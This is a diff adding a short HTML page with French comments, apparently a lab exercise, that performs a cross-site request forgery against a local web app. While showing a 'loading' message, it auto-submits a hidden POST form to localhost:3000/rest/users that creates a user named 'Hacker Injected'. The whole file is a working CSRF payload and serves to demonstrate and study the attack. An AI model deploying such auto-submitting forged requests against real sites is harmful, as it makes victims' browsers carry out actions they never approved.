@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<!--Cette page a pour objectif de créer un nouvel étudiant à l'aide d'un formulaire auto-submit -->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>😈 CSRF Attack – Add Student</title>
+</head>
+<body>
+  <h1>Chargement en cours...</h1>
+  <!-- Étape 1 : soumission du POST via le formulaire -->
+  <form id="csrfForm" action="http://localhost:3000/rest/users" method="POST" style="display:none;">
+    <input type="text" name="name" value="Hacker Injected" />
+    <input type="email" name="email" value="evil@hacker.com" />
+    <button type="submit">Submit</button>
+  </form>
+
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
